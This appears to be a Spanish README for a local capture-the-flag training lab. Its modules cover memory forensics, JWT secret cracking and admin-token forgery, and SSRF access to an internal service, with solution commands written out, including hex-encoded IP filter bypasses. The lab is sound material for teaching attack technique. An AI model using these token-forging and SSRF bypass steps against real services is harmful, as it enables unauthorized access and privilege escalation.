# Lab 02 — Intermediate: Operation Pivot Point

## Objetivo
JWT bypass, SSRF para acceder a redes internas, forense de memoria RAM
y criptoanálisis básico.

## Arranque

```bash
# Generar certificado TLS primero
bash nginx/gen-certs.sh
make lab02
```

## Servicios

| Servicio | URL | Notas |
|----------|-----|-------|
| API Gateway (NGINX+Node) | https://localhost:9443 | cert autofirmado |
| Forensics Server | http://localhost:9090 | archivos de práctica |
| Volatility Notebook | http://localhost:8888 | token: lab2024 |

## Módulos y flags

### Flag #1 — Forense RAM
1. Descarga una imagen MemLabs: https://github.com/stuxnet999/MemLabs
2. Cópiala a `lab02/forensics/incident.raw`
3. Abre http://localhost:8888 → notebook.ipynb
4. Ejecuta las celdas de análisis

### Flag #2 — JWT Admin
```bash
# 1. Obtener token como guest
curl -k -X POST https://localhost:9443/api/login \
     -H "Content-Type: application/json" \
     -d '{"user":"guest","pass":"guest123"}'

# 2. Decodificar JWT (jwt.io o python)
python3 -c "import jwt; print(jwt.decode('TOKEN', options={'verify_signature':False}))"

# 3. Bruteforcear secret (hashcat)
# hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# 4. Forjar token admin
python3 -c "import jwt; print(jwt.encode({'user':'admin','role':'admin'}, 'w34k_jwt_s3cr3t_lab02', 'HS256'))"

# 5. Acceder al endpoint admin
curl -k https://localhost:9443/api/admin/flag -H "Authorization: Bearer FORGED_TOKEN"
```

### Flag #3 — SSRF
```bash
# Acceder al servicio interno via SSRF
curl -k -X POST https://localhost:9443/api/fetch \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://flask-ssrf:8080/internal/flag"}'

# Bypass de filtros
-d '{"url":"http://10.10.102.20:8080/internal/flag"}'
-d '{"url":"http://0x0a0a6614:8080/internal/flag"}'
```
